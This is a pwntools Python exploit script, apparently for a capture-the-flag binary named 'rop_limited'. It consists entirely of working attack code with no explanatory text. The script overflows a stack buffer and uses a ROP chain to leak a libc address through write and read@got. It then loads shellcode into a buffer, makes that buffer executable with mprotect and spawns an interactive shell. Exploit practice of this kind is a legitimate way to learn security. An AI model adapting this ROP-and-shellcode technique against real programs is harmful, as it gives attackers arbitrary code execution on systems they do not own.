from pwn import *

binary = "rop_limited"

context.log_level = 'error'
context.binary = binary
p = process(binary)
elf = ELF(binary)
libc = ELF("/usr/lib/libc.so.6") # from `ldd rop`

off = 0x38

pop_rdi = 0x0000000000401203
pop_rsi_r15 = 0x0000000000401201
pop_rdx = 0x000000000040113a

buf = 0x00404100

# write(1, read@got, 8)
leak_chain = p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(elf.got['read']) + p64(0) + p64(pop_rdx) + p64(8) + p64(elf.plt['write'])

chain = b"A" * off + leak_chain + p64(elf.entry)
p.send(chain + b" " * (0x80 - len(chain)))

read_addr = u64(p.recv(8))
libc.address = read_addr - libc.symbols['read']

# read(0, buf, 0x200)
read_shellcode_chain = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(buf) + p64(0) + p64(pop_rdx) + p64(0x100) + p64(elf.plt['read'])
chain = b"A" * off + read_shellcode_chain + p64(elf.entry)
p.send(chain + b" " * (0x80 - len(chain)))

shellcode = asm(shellcraft.sh())
p.send(shellcode + b"\x00" * (0x100 - len(shellcode)))

# mprotect(buf, 0x200, 7)
call_mprotect_chain = p64(pop_rdi) + p64(buf-0x100) + p64(pop_rsi_r15) + p64(0x200) + p64(0) + p64(pop_rdx) + p64(7) + p64(libc.symbols['mprotect'])

# call mprotect and return to buf shellcode
chain = b"A" * off + call_mprotect_chain + p64(buf)
p.send(chain + b" " * (0x80 - len(chain)))

p.interactive()
